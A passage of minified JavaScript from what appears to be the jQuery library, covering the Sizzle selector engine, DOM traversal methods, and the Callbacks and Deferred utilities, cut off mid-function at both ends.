a.length=e,a},grep:function(a,b,c){for(var d,e=[],f=0,g=a.length,h=!c;g>f;f++)d=!b(a[f],f),d!==h&&e.push(a[f]);return e},map:function(a,b,c){var d,f=0,g=a.length,h=s(a),i=[];if(h)for(;g>f;f++)d=b(a[f],f,c),null!=d&&i.push(d);else for(f in a)d=b(a[f],f,c),null!=d&&i.push(d);return e.apply([],i)},guid:1,proxy:function(a,b){var c,e,f;return"string"==typeof b&&(c=a[b],b=a,a=c),n.isFunction(a)?(e=d.call(arguments,2),f=function(){return a.apply(b||this,e.concat(d.call(arguments)))},f.guid=a.guid=a.guid||n.guid++,f):void 0},now:Date.now,support:k}),n.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(a,b){h["[object "+b+"]"]=b.toLowerCase()});function s(a){var b=a.length,c=n.type(a);return"function"===c||n.isWindow(a)?!1:1===a.nodeType&&b?!0:"array"===c||0===b||"number"==typeof b&&b>0&&b-1 in a}var t=function(a){var b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u="sizzle"+1*new Date,v=a.document,w=0,x=0,y=hb(),z=hb(),A=hb(),B=function(a,b){return a===b&&(l=!0),0},C=1<<31,D={}.hasOwnProperty,E=[],F=E.pop,G=E.push,H=E.push,I=E.slice,J=function(a,b){for(var c=0,d=a.length;d>c;c++)if(a[c]===b)return c;return-1},K="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",L="[\\x20\\t\\r\\n\\f]",M="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",N=M.replace("w","w#"),O="\\["+L+"*("+M+")(?:"+L+"*([*^$|!~]?=)"+L+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+N+"))|)"+L+"*\\]",P=":("+M+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+O+")*)|.*)\\)|)",Q=new RegExp(L+"+","g"),R=new RegExp("^"+L+"+|((?:^|[^\\\\])(?:\\\\.)*)"+L+"+$","g"),S=new RegExp("^"+L+"*,"+L+"*"),T=new RegExp("^"+L+"*([>+~]|"+L+")"+L+"*"),U=new RegExp("="+L+"*([^\\]'\"]*?)"+L+"*\\]","g"),V=new RegExp(P),W=new RegExp("^"+N+"$"),X={ID:new RegExp("^#("+M+")"),CLASS:new RegExp("^\\.("+M+")"),TAG:new RegExp("^("+M.replace("w","w*")+")"),ATTR:new RegExp("^"+O),PSEUDO:new RegExp("^"+P),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+L+"*(even|odd|(([+-]|)(\\d*)n|)"+L+"*(?:([+-]|)"+L+"*(\\d+)|))"+L+"*\\)|)","i"),bool:new RegExp("^(?:"+K+")$","i"),needsContext:new RegExp("^"+L+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+L+"*((?:-\\d)?\\d*)"+L+"*\\)|)(?=[^-]|$)","i")},Y=/^(?:input|select|textarea|button)$/i,Z=/^h\d$/i,$=/^[^{]+\{\s*\[native \w/,_=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,ab=/[+~]/,bb=/'|\\/g,cb=new RegExp("\\\\([\\da-f]{1,6}"+L+"?|("+L+")|.)","ig"),db=function(a,b,c){var d="0x"+b-65536;return d!==d||c?b:0>d?String.fromCharCode(d+65536):String.fromCharCode(d>>10|55296,1023&d|56320)},eb=function(){m()};try{H.apply(E=I.call(v.childNodes),v.childNodes),E[v.childNodes.length].nodeType}catch(fb){H={apply:E.length?function(a,b){G.apply(a,I.call(b))}:function(a,b){var c=a.length,d=0;while(a[c++]=b[d++]);a.length=c-1}}}function gb(a,b,d,e){var f,h,j,k,l,o,r,s,w,x;if((b?b.ownerDocument||b:v)!==n&&m(b),b=b||n,d=d||[],k=b.nodeType,"string"!=typeof a||!a||1!==k&&9!==k&&11!==k)return d;if(!e&&p){if(11!==k&&(f=_.exec(a)))if(j=f[1]){if(9===k){if(h=b.getElementById(j),!h||!h.parentNode)return d;if(h.id===j)return d.push(h),d}else if(b.ownerDocument&&(h=b.ownerDocument.getElementById(j))&&t(b,h)&&h.id===j)return d.push(h),d}else{if(f[2])return H.apply(d,b.getElementsByTagName(a)),d;if((j=f[3])&&c.getElementsByClassName)return H.apply(d,b.getElementsByClassName(j)),d}if(c.qsa&&(!q||!q.test(a))){if(s=r=u,w=b,x=1!==k&&a,1===k&&"object"!==b.nodeName.toLowerCase()){o=g(a),(r=b.getAttribute("id"))?s=r.replace(bb,"\\$&"):b.setAttribute("id",s),s="[id='"+s+"'] ",l=o.length;while(l--)o[l]=s+rb(o[l]);w=ab.test(a)&&pb(b.parentNode)||b,x=o.join(",")}if(x)try{return H.apply(d,w.querySelectorAll(x)),d}catch(y){}finally{r||b.removeAttribute("id")}}}return i(a.replace(R,"$1"),b,d,e)}function hb(){var a=[];function b(c,e){return a.push(c+" ")>d.cacheLength&&delete b[a.shift()],b[c+" "]=e}return b}function ib(a){return a[u]=!0,a}function jb(a){var b=n.createElement("div");try{return!!a(b)}catch(c){return!1}finally{b.parentNode&&b.parentNode.removeChild(b),b=null}}function kb(a,b){var c=a.split("|"),e=a.length;while(e--)d.attrHandle[c[e]]=b}function lb(a,b){var c=b&&a,d=c&&1===a.nodeType&&1===b.nodeType&&(~b.sourceIndex||C)-(~a.sourceIndex||C);if(d)return d;if(c)while(c=c.nextSibling)if(c===b)return-1;return a?1:-1}function mb(a){return function(b){var c=b.nodeName.toLowerCase();return"input"===c&&b.type===a}}function nb(a){return function(b){var c=b.nodeName.toLowerCase();return("input"===c||"button"===c)&&b.type===a}}function ob(a){return ib(function(b){return b=+b,ib(function(c,d){var e,f=a([],c.length,b),g=f.length;while(g--)c[e=f[g]]&&(c[e]=!(d[e]=c[e]))})})}function pb(a){return a&&"undefined"!=typeof a.getElementsByTagName&&a}c=gb.support={},f=gb.isXML=function(a){var b=a&&(a.ownerDocument||a).documentElement;return b?"HTML"!==b.nodeName:!1},m=gb.setDocument=function(a){var b,e,g=a?a.ownerDocument||a:v;return g!==n&&9===g.nodeType&&g.documentElement?(n=g,o=g.documentElement,e=g.defaultView,e&&e!==e.top&&(e.addEventListener?e.addEventListener("unload",eb,!1):e.attachEvent&&e.attachEvent("onunload",eb)),p=!f(g),c.attributes=jb(function(a){return a.className="i",!a.getAttribute("className")}),c.getElementsByTagName=jb(function(a){return a.appendChild(g.createComment("")),!a.getElementsByTagName("*").length}),c.getElementsByClassName=$.test(g.getElementsByClassName),c.getById=jb(function(a){return o.appendChild(a).id=u,!g.getElementsByName||!g.getElementsByName(u).length}),c.getById?(d.find.ID=function(a,b){if("undefined"!=typeof b.getElementById&&p){var c=b.getElementById(a);return c&&c.parentNode?[c]:[]}},d.filter.ID=function(a){var b=a.replace(cb,db);return function(a){return a.getAttribute("id")===b}}):(delete d.find.ID,d.filter.ID=function(a){var b=a.replace(cb,db);return function(a){var c="undefined"!=typeof a.getAttributeNode&&a.getAttributeNode("id");return c&&c.value===b}}),d.find.TAG=c.getElementsByTagName?function(a,b){return"undefined"!=typeof b.getElementsByTagName?b.getElementsByTagName(a):c.qsa?b.querySelectorAll(a):void 0}:function(a,b){var c,d=[],e=0,f=b.getElementsByTagName(a);if("*"===a){while(c=f[e++])1===c.nodeType&&d.push(c);return d}return f},d.find.CLASS=c.getElementsByClassName&&function(a,b){return p?b.getElementsByClassName(a):void 0},r=[],q=[],(c.qsa=$.test(g.querySelectorAll))&&(jb(function(a){o.appendChild(a).innerHTML="<a id='"+u+"'></a><select id='"+u+"-\f]' msallowcapture=''><option selected=''></option></select>",a.querySelectorAll("[msallowcapture^='']").length&&q.push("[*^$]="+L+"*(?:''|\"\")"),a.querySelectorAll("[selected]").length||q.push("\\["+L+"*(?:value|"+K+")"),a.querySelectorAll("[id~="+u+"-]").length||q.push("~="),a.querySelectorAll(":checked").length||q.push(":checked"),a.querySelectorAll("a#"+u+"+*").length||q.push(".#.+[+~]")}),jb(function(a){var b=g.createElement("input");b.setAttribute("type","hidden"),a.appendChild(b).setAttribute("name","D"),a.querySelectorAll("[name=d]").length&&q.push("name"+L+"*[*^$|!~]?="),a.querySelectorAll(":enabled").length||q.push(":enabled",":disabled"),a.querySelectorAll("*,:x"),q.push(",.*:")})),(c.matchesSelector=$.test(s=o.matches||o.webkitMatchesSelector||o.mozMatchesSelector||o.oMatchesSelector||o.msMatchesSelector))&&jb(function(a){c.disconnectedMatch=s.call(a,"div"),s.call(a,"[s!='']:x"),r.push("!=",P)}),q=q.length&&new RegExp(q.join("|")),r=r.length&&new RegExp(r.join("|")),b=$.test(o.compareDocumentPosition),t=b||$.test(o.contains)?function(a,b){var c=9===a.nodeType?a.documentElement:a,d=b&&b.parentNode;return a===d||!(!d||1!==d.nodeType||!(c.contains?c.contains(d):a.compareDocumentPosition&&16&a.compareDocumentPosition(d)))}:function(a,b){if(b)while(b=b.parentNode)if(b===a)return!0;return!1},B=b?function(a,b){if(a===b)return l=!0,0;var d=!a.compareDocumentPosition-!b.compareDocumentPosition;return d?d:(d=(a.ownerDocument||a)===(b.ownerDocument||b)?a.compareDocumentPosition(b):1,1&d||!c.sortDetached&&b.compareDocumentPosition(a)===d?a===g||a.ownerDocument===v&&t(v,a)?-1:b===g||b.ownerDocument===v&&t(v,b)?1:k?J(k,a)-J(k,b):0:4&d?-1:1)}:function(a,b){if(a===b)return l=!0,0;var c,d=0,e=a.parentNode,f=b.parentNode,h=[a],i=[b];if(!e||!f)return a===g?-1:b===g?1:e?-1:f?1:k?J(k,a)-J(k,b):0;if(e===f)return lb(a,b);c=a;while(c=c.parentNode)h.unshift(c);c=b;while(c=c.parentNode)i.unshift(c);while(h[d]===i[d])d++;return d?lb(h[d],i[d]):h[d]===v?-1:i[d]===v?1:0},g):n},gb.matches=function(a,b){return gb(a,null,null,b)},gb.matchesSelector=function(a,b){if((a.ownerDocument||a)!==n&&m(a),b=b.replace(U,"='$1']"),!(!c.matchesSelector||!p||r&&r.test(b)||q&&q.test(b)))try{var d=s.call(a,b);if(d||c.disconnectedMatch||a.document&&11!==a.document.nodeType)return d}catch(e){}return gb(b,n,null,[a]).length>0},gb.contains=function(a,b){return(a.ownerDocument||a)!==n&&m(a),t(a,b)},gb.attr=function(a,b){(a.ownerDocument||a)!==n&&m(a);var e=d.attrHandle[b.toLowerCase()],f=e&&D.call(d.attrHandle,b.toLowerCase())?e(a,b,!p):void 0;return void 0!==f?f:c.attributes||!p?a.getAttribute(b):(f=a.getAttributeNode(b))&&f.specified?f.value:null},gb.error=function(a){throw new Error("Syntax error, unrecognized expression: "+a)},gb.uniqueSort=function(a){var b,d=[],e=0,f=0;if(l=!c.detectDuplicates,k=!c.sortStable&&a.slice(0),a.sort(B),l){while(b=a[f++])b===a[f]&&(e=d.push(f));while(e--)a.splice(d[e],1)}return k=null,a},e=gb.getText=function(a){var b,c="",d=0,f=a.nodeType;if(f){if(1===f||9===f||11===f){if("string"==typeof a.textContent)return a.textContent;for(a=a.firstChild;a;a=a.nextSibling)c+=e(a)}else if(3===f||4===f)return a.nodeValue}else while(b=a[d++])c+=e(b);return c},d=gb.selectors={cacheLength:50,createPseudo:ib,match:X,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(a){return a[1]=a[1].replace(cb,db),a[3]=(a[3]||a[4]||a[5]||"").replace(cb,db),"~="===a[2]&&(a[3]=" "+a[3]+" "),a.slice(0,4)},CHILD:function(a){return a[1]=a[1].toLowerCase(),"nth"===a[1].slice(0,3)?(a[3]||gb.error(a[0]),a[4]=+(a[4]?a[5]+(a[6]||1):2*("even"===a[3]||"odd"===a[3])),a[5]=+(a[7]+a[8]||"odd"===a[3])):a[3]&&gb.error(a[0]),a},PSEUDO:function(a){var b,c=!a[6]&&a[2];return X.CHILD.test(a[0])?null:(a[3]?a[2]=a[4]||a[5]||"":c&&V.test(c)&&(b=g(c,!0))&&(b=c.indexOf(")",c.length-b)-c.length)&&(a[0]=a[0].slice(0,b),a[2]=c.slice(0,b)),a.slice(0,3))}},filter:{TAG:function(a){var b=a.replace(cb,db).toLowerCase();return"*"===a?function(){return!0}:function(a){return a.nodeName&&a.nodeName.toLowerCase()===b}},CLASS:function(a){var b=y[a+" "];return b||(b=new RegExp("(^|"+L+")"+a+"("+L+"|$)"))&&y(a,function(a){return b.test("string"==typeof a.className&&a.className||"undefined"!=typeof a.getAttribute&&a.getAttribute("class")||"")})},ATTR:function(a,b,c){return function(d){var e=gb.attr(d,a);return null==e?"!="===b:b?(e+="","="===b?e===c:"!="===b?e!==c:"^="===b?c&&0===e.indexOf(c):"*="===b?c&&e.indexOf(c)>-1:"$="===b?c&&e.slice(-c.length)===c:"~="===b?(" "+e.replace(Q," ")+" ").indexOf(c)>-1:"|="===b?e===c||e.slice(0,c.length+1)===c+"-":!1):!0}},CHILD:function(a,b,c,d,e){var f="nth"!==a.slice(0,3),g="last"!==a.slice(-4),h="of-type"===b;return 1===d&&0===e?function(a){return!!a.parentNode}:function(b,c,i){var j,k,l,m,n,o,p=f!==g?"nextSibling":"previousSibling",q=b.parentNode,r=h&&b.nodeName.toLowerCase(),s=!i&&!h;if(q){if(f){while(p){l=b;while(l=l[p])if(h?l.nodeName.toLowerCase()===r:1===l.nodeType)return!1;o=p="only"===a&&!o&&"nextSibling"}return!0}if(o=[g?q.firstChild:q.lastChild],g&&s){k=q[u]||(q[u]={}),j=k[a]||[],n=j[0]===w&&j[1],m=j[0]===w&&j[2],l=n&&q.childNodes[n];while(l=++n&&l&&l[p]||(m=n=0)||o.pop())if(1===l.nodeType&&++m&&l===b){k[a]=[w,n,m];break}}else if(s&&(j=(b[u]||(b[u]={}))[a])&&j[0]===w)m=j[1];else while(l=++n&&l&&l[p]||(m=n=0)||o.pop())if((h?l.nodeName.toLowerCase()===r:1===l.nodeType)&&++m&&(s&&((l[u]||(l[u]={}))[a]=[w,m]),l===b))break;return m-=e,m===d||m%d===0&&m/d>=0}}},PSEUDO:function(a,b){var c,e=d.pseudos[a]||d.setFilters[a.toLowerCase()]||gb.error("unsupported pseudo: "+a);return e[u]?e(b):e.length>1?(c=[a,a,"",b],d.setFilters.hasOwnProperty(a.toLowerCase())?ib(function(a,c){var d,f=e(a,b),g=f.length;while(g--)d=J(a,f[g]),a[d]=!(c[d]=f[g])}):function(a){return e(a,0,c)}):e}},pseudos:{not:ib(function(a){var b=[],c=[],d=h(a.replace(R,"$1"));return d[u]?ib(function(a,b,c,e){var f,g=d(a,null,e,[]),h=a.length;while(h--)(f=g[h])&&(a[h]=!(b[h]=f))}):function(a,e,f){return b[0]=a,d(b,null,f,c),b[0]=null,!c.pop()}}),has:ib(function(a){return function(b){return gb(a,b).length>0}}),contains:ib(function(a){return a=a.replace(cb,db),function(b){return(b.textContent||b.innerText||e(b)).indexOf(a)>-1}}),lang:ib(function(a){return W.test(a||"")||gb.error("unsupported lang: "+a),a=a.replace(cb,db).toLowerCase(),function(b){var c;do if(c=p?b.lang:b.getAttribute("xml:lang")||b.getAttribute("lang"))return c=c.toLowerCase(),c===a||0===c.indexOf(a+"-");while((b=b.parentNode)&&1===b.nodeType);return!1}}),target:function(b){var c=a.location&&a.location.hash;return c&&c.slice(1)===b.id},root:function(a){return a===o},focus:function(a){return a===n.activeElement&&(!n.hasFocus||n.hasFocus())&&!!(a.type||a.href||~a.tabIndex)},enabled:function(a){return a.disabled===!1},disabled:function(a){return a.disabled===!0},checked:function(a){var b=a.nodeName.toLowerCase();return"input"===b&&!!a.checked||"option"===b&&!!a.selected},selected:function(a){return a.parentNode&&a.parentNode.selectedIndex,a.selected===!0},empty:function(a){for(a=a.firstChild;a;a=a.nextSibling)if(a.nodeType<6)return!1;return!0},parent:function(a){return!d.pseudos.empty(a)},header:function(a){return Z.test(a.nodeName)},input:function(a){return Y.test(a.nodeName)},button:function(a){var b=a.nodeName.toLowerCase();return"input"===b&&"button"===a.type||"button"===b},text:function(a){var b;return"input"===a.nodeName.toLowerCase()&&"text"===a.type&&(null==(b=a.getAttribute("type"))||"text"===b.toLowerCase())},first:ob(function(){return[0]}),last:ob(function(a,b){return[b-1]}),eq:ob(function(a,b,c){return[0>c?c+b:c]}),even:ob(function(a,b){for(var c=0;b>c;c+=2)a.push(c);return a}),odd:ob(function(a,b){for(var c=1;b>c;c+=2)a.push(c);return a}),lt:ob(function(a,b,c){for(var d=0>c?c+b:c;--d>=0;)a.push(d);return a}),gt:ob(function(a,b,c){for(var d=0>c?c+b:c;++d<b;)a.push(d);return a})}},d.pseudos.nth=d.pseudos.eq;for(b in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})d.pseudos[b]=mb(b);for(b in{submit:!0,reset:!0})d.pseudos[b]=nb(b);function qb(){}qb.prototype=d.filters=d.pseudos,d.setFilters=new qb,g=gb.tokenize=function(a,b){var c,e,f,g,h,i,j,k=z[a+" "];if(k)return b?0:k.slice(0);h=a,i=[],j=d.preFilter;while(h){(!c||(e=S.exec(h)))&&(e&&(h=h.slice(e[0].length)||h),i.push(f=[])),c=!1,(e=T.exec(h))&&(c=e.shift(),f.push({value:c,type:e[0].replace(R," ")}),h=h.slice(c.length));for(g in d.filter)!(e=X[g].exec(h))||j[g]&&!(e=j[g](e))||(c=e.shift(),f.push({value:c,type:g,matches:e}),h=h.slice(c.length));if(!c)break}return b?h.length:h?gb.error(a):z(a,i).slice(0)};function rb(a){for(var b=0,c=a.length,d="";c>b;b++)d+=a[b].value;return d}function sb(a,b,c){var d=b.dir,e=c&&"parentNode"===d,f=x++;return b.first?function(b,c,f){while(b=b[d])if(1===b.nodeType||e)return a(b,c,f)}:function(b,c,g){var h,i,j=[w,f];if(g){while(b=b[d])if((1===b.nodeType||e)&&a(b,c,g))return!0}else while(b=b[d])if(1===b.nodeType||e){if(i=b[u]||(b[u]={}),(h=i[d])&&h[0]===w&&h[1]===f)return j[2]=h[2];if(i[d]=j,j[2]=a(b,c,g))return!0}}}function tb(a){return a.length>1?function(b,c,d){var e=a.length;while(e--)if(!a[e](b,c,d))return!1;return!0}:a[0]}function ub(a,b,c){for(var d=0,e=b.length;e>d;d++)gb(a,b[d],c);return c}function vb(a,b,c,d,e){for(var f,g=[],h=0,i=a.length,j=null!=b;i>h;h++)(f=a[h])&&(!c||c(f,d,e))&&(g.push(f),j&&b.push(h));return g}function wb(a,b,c,d,e,f){return d&&!d[u]&&(d=wb(d)),e&&!e[u]&&(e=wb(e,f)),ib(function(f,g,h,i){var j,k,l,m=[],n=[],o=g.length,p=f||ub(b||"*",h.nodeType?[h]:h,[]),q=!a||!f&&b?p:vb(p,m,a,h,i),r=c?e||(f?a:o||d)?[]:g:q;if(c&&c(q,r,h,i),d){j=vb(r,n),d(j,[],h,i),k=j.length;while(k--)(l=j[k])&&(r[n[k]]=!(q[n[k]]=l))}if(f){if(e||a){if(e){j=[],k=r.length;while(k--)(l=r[k])&&j.push(q[k]=l);e(null,r=[],j,i)}k=r.length;while(k--)(l=r[k])&&(j=e?J(f,l):m[k])>-1&&(f[j]=!(g[j]=l))}}else r=vb(r===g?r.splice(o,r.length):r),e?e(null,g,r,i):H.apply(g,r)})}function xb(a){for(var b,c,e,f=a.length,g=d.relative[a[0].type],h=g||d.relative[" "],i=g?1:0,k=sb(function(a){return a===b},h,!0),l=sb(function(a){return J(b,a)>-1},h,!0),m=[function(a,c,d){var e=!g&&(d||c!==j)||((b=c).nodeType?k(a,c,d):l(a,c,d));return b=null,e}];f>i;i++)if(c=d.relative[a[i].type])m=[sb(tb(m),c)];else{if(c=d.filter[a[i].type].apply(null,a[i].matches),c[u]){for(e=++i;f>e;e++)if(d.relative[a[e].type])break;return wb(i>1&&tb(m),i>1&&rb(a.slice(0,i-1).concat({value:" "===a[i-2].type?"*":""})).replace(R,"$1"),c,e>i&&xb(a.slice(i,e)),f>e&&xb(a=a.slice(e)),f>e&&rb(a))}m.push(c)}return tb(m)}function yb(a,b){var c=b.length>0,e=a.length>0,f=function(f,g,h,i,k){var l,m,o,p=0,q="0",r=f&&[],s=[],t=j,u=f||e&&d.find.TAG("*",k),v=w+=null==t?1:Math.random()||.1,x=u.length;for(k&&(j=g!==n&&g);q!==x&&null!=(l=u[q]);q++){if(e&&l){m=0;while(o=a[m++])if(o(l,g,h)){i.push(l);break}k&&(w=v)}c&&((l=!o&&l)&&p--,f&&r.push(l))}if(p+=q,c&&q!==p){m=0;while(o=b[m++])o(r,s,g,h);if(f){if(p>0)while(q--)r[q]||s[q]||(s[q]=F.call(i));s=vb(s)}H.apply(i,s),k&&!f&&s.length>0&&p+b.length>1&&gb.uniqueSort(i)}return k&&(w=v,j=t),r};return c?ib(f):f}return h=gb.compile=function(a,b){var c,d=[],e=[],f=A[a+" "];if(!f){b||(b=g(a)),c=b.length;while(c--)f=xb(b[c]),f[u]?d.push(f):e.push(f);f=A(a,yb(e,d)),f.selector=a}return f},i=gb.select=function(a,b,e,f){var i,j,k,l,m,n="function"==typeof a&&a,o=!f&&g(a=n.selector||a);if(e=e||[],1===o.length){if(j=o[0]=o[0].slice(0),j.length>2&&"ID"===(k=j[0]).type&&c.getById&&9===b.nodeType&&p&&d.relative[j[1].type]){if(b=(d.find.ID(k.matches[0].replace(cb,db),b)||[])[0],!b)return e;n&&(b=b.parentNode),a=a.slice(j.shift().value.length)}i=X.needsContext.test(a)?0:j.length;while(i--){if(k=j[i],d.relative[l=k.type])break;if((m=d.find[l])&&(f=m(k.matches[0].replace(cb,db),ab.test(j[0].type)&&pb(b.parentNode)||b))){if(j.splice(i,1),a=f.length&&rb(j),!a)return H.apply(e,f),e;break}}}return(n||h(a,o))(f,b,!p,e,ab.test(a)&&pb(b.parentNode)||b),e},c.sortStable=u.split("").sort(B).join("")===u,c.detectDuplicates=!!l,m(),c.sortDetached=jb(function(a){return 1&a.compareDocumentPosition(n.createElement("div"))}),jb(function(a){return a.innerHTML="<a href='#'></a>","#"===a.firstChild.getAttribute("href")})||kb("type|href|height|width",function(a,b,c){return c?void 0:a.getAttribute(b,"type"===b.toLowerCase()?1:2)}),c.attributes&&jb(function(a){return a.innerHTML="<input/>",a.firstChild.setAttribute("value",""),""===a.firstChild.getAttribute("value")})||kb("value",function(a,b,c){return c||"input"!==a.nodeName.toLowerCase()?void 0:a.defaultValue}),jb(function(a){return null==a.getAttribute("disabled")})||kb(K,function(a,b,c){var d;return c?void 0:a[b]===!0?b.toLowerCase():(d=a.getAttributeNode(b))&&d.specified?d.value:null}),gb}(a);n.find=t,n.expr=t.selectors,n.expr[":"]=n.expr.pseudos,n.unique=t.uniqueSort,n.text=t.getText,n.isXMLDoc=t.isXML,n.contains=t.contains;var u=n.expr.match.needsContext,v=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,w=/^.[^:#\[\.,]*$/;function x(a,b,c){if(n.isFunction(b))return n.grep(a,function(a,d){return!!b.call(a,d,a)!==c});if(b.nodeType)return n.grep(a,function(a){return a===b!==c});if("string"==typeof b){if(w.test(b))return n.filter(b,a,c);b=n.filter(b,a)}return n.grep(a,function(a){return g.call(b,a)>=0!==c})}n.filter=function(a,b,c){var d=b[0];return c&&(a=":not("+a+")"),1===b.length&&1===d.nodeType?n.find.matchesSelector(d,a)?[d]:[]:n.find.matches(a,n.grep(b,function(a){return 1===a.nodeType}))},n.fn.extend({find:function(a){var b,c=this.length,d=[],e=this;if("string"!=typeof a)return this.pushStack(n(a).filter(function(){for(b=0;c>b;b++)if(n.contains(e[b],this))return!0}));for(b=0;c>b;b++)n.find(a,e[b],d);return d=this.pushStack(c>1?n.unique(d):d),d.selector=this.selector?this.selector+" "+a:a,d},filter:function(a){return this.pushStack(x(this,a||[],!1))},not:function(a){return this.pushStack(x(this,a||[],!0))},is:function(a){return!!x(this,"string"==typeof a&&u.test(a)?n(a):a||[],!1).length}});var y,z=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,A=n.fn.init=function(a,b){var c,d;if(!a)return this;if("string"==typeof a){if(c="<"===a[0]&&">"===a[a.length-1]&&a.length>=3?[null,a,null]:z.exec(a),!c||!c[1]&&b)return!b||b.jquery?(b||y).find(a):this.constructor(b).find(a);if(c[1]){if(b=b instanceof n?b[0]:b,n.merge(this,n.parseHTML(c[1],b&&b.nodeType?b.ownerDocument||b:l,!0)),v.test(c[1])&&n.isPlainObject(b))for(c in b)n.isFunction(this[c])?this[c](b[c]):this.attr(c,b[c]);return this}return d=l.getElementById(c[2]),d&&d.parentNode&&(this.length=1,this[0]=d),this.context=l,this.selector=a,this}return a.nodeType?(this.context=this[0]=a,this.length=1,this):n.isFunction(a)?"undefined"!=typeof y.ready?y.ready(a):a(n):(void 0!==a.selector&&(this.selector=a.selector,this.context=a.context),n.makeArray(a,this))};A.prototype=n.fn,y=n(l);var B=/^(?:parents|prev(?:Until|All))/,C={children:!0,contents:!0,next:!0,prev:!0};n.extend({dir:function(a,b,c){var d=[],e=void 0!==c;while((a=a[b])&&9!==a.nodeType)if(1===a.nodeType){if(e&&n(a).is(c))break;d.push(a)}return d},sibling:function(a,b){for(var c=[];a;a=a.nextSibling)1===a.nodeType&&a!==b&&c.push(a);return c}}),n.fn.extend({has:function(a){var b=n(a,this),c=b.length;return this.filter(function(){for(var a=0;c>a;a++)if(n.contains(this,b[a]))return!0})},closest:function(a,b){for(var c,d=0,e=this.length,f=[],g=u.test(a)||"string"!=typeof a?n(a,b||this.context):0;e>d;d++)for(c=this[d];c&&c!==b;c=c.parentNode)if(c.nodeType<11&&(g?g.index(c)>-1:1===c.nodeType&&n.find.matchesSelector(c,a))){f.push(c);break}return this.pushStack(f.length>1?n.unique(f):f)},index:function(a){return a?"string"==typeof a?g.call(n(a),this[0]):g.call(this,a.jquery?a[0]:a):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(a,b){return this.pushStack(n.unique(n.merge(this.get(),n(a,b))))},addBack:function(a){return this.add(null==a?this.prevObject:this.prevObject.filter(a))}});function D(a,b){while((a=a[b])&&1!==a.nodeType);return a}n.each({parent:function(a){var b=a.parentNode;return b&&11!==b.nodeType?b:null},parents:function(a){return n.dir(a,"parentNode")},parentsUntil:function(a,b,c){return n.dir(a,"parentNode",c)},next:function(a){return D(a,"nextSibling")},prev:function(a){return D(a,"previousSibling")},nextAll:function(a){return n.dir(a,"nextSibling")},prevAll:function(a){return n.dir(a,"previousSibling")},nextUntil:function(a,b,c){return n.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return n.dir(a,"previousSibling",c)},siblings:function(a){return n.sibling((a.parentNode||{}).firstChild,a)},children:function(a){return n.sibling(a.firstChild)},contents:function(a){return a.contentDocument||n.merge([],a.childNodes)}},function(a,b){n.fn[a]=function(c,d){var e=n.map(this,b,c);return"Until"!==a.slice(-5)&&(d=c),d&&"string"==typeof d&&(e=n.filter(d,e)),this.length>1&&(C[a]||n.unique(e),B.test(a)&&e.reverse()),this.pushStack(e)}});var E=/\S+/g,F={};function G(a){var b=F[a]={};return n.each(a.match(E)||[],function(a,c){b[c]=!0}),b}n.Callbacks=function(a){a="string"==typeof a?F[a]||G(a):n.extend({},a);var b,c,d,e,f,g,h=[],i=!a.once&&[],j=function(l){for(b=a.memory&&l,c=!0,g=e||0,e=0,f=h.length,d=!0;h&&f>g;g++)if(h[g].apply(l[0],l[1])===!1&&a.stopOnFalse){b=!1;break}d=!1,h&&(i?i.length&&j(i.shift()):b?h=[]:k.disable())},k={add:function(){if(h){var c=h.length;!function g(b){n.each(b,function(b,c){var d=n.type(c);"function"===d?a.unique&&k.has(c)||h.push(c):c&&c.length&&"string"!==d&&g(c)})}(arguments),d?f=h.length:b&&(e=c,j(b))}return this},remove:function(){return h&&n.each(arguments,function(a,b){var c;while((c=n.inArray(b,h,c))>-1)h.splice(c,1),d&&(f>=c&&f--,g>=c&&g--)}),this},has:function(a){return a?n.inArray(a,h)>-1:!(!h||!h.length)},empty:function(){return h=[],f=0,this},disable:function(){return h=i=b=void 0,this},disabled:function(){return!h},lock:function(){return i=void 0,b||k.disable(),this},locked:function(){return!i},fireWith:function(a,b){return!h||c&&!i||(b=b||[],b=[a,b.slice?b.slice():b],d?i.push(b):j(b)),this},fire:function(){return k.fireWith(this,arguments),this},fired:function(){return!!c}};return k},n.extend({Deferred:function(a){var b=[["resolve","done",n.Callbacks("once memory"),"resolved"],["reject","fail",n.Callbacks("once memory"),"rejected"],["notify","progress",n.Callbacks("memory")]],c="pending",d={state:function(){return c},always:function(){return e.done(arguments).fail(arguments),this},then:function(){var a=arguments;return n.Deferred(function(c){n.each(b,function(b,f){var g=n.isFunction(a[b])&&a[b];e[f[1]](function(){var a=g&&g.apply(this,arguments);a&&n.isFunction(a.promise)?a.promise().done(c.resolve).fail(c.reject).progress(c.notify):c[f[0]+"With"](this===d?c.promise():this,g?[a]:arguments)})}),a=null}).promise()},promise:function(a){return null!=a?n.extend(a,d):d}},e={};return d.pipe=d.then,n.each(b,function(a,f){var g=f[2],h=f[3];d[f[1]]=g.add,h&&g.add(function(){c=h},b[1^a][2].disable,b[2][2].lock),e[f[0]]=function(){return e[f[0]+"With"](this===e?d:this,arguments),this},e[f[0]+"With"]=g.fireWith}),d.promise(e),a&&a.call(e,e),e},when:function(a){var b=0,c=d.call(arguments),e=c.length,f=1!==e||a&&n.isFunction(a.promise)?e:0,g=1===f?a:n.Deferred(),h=function(a,b,c){return 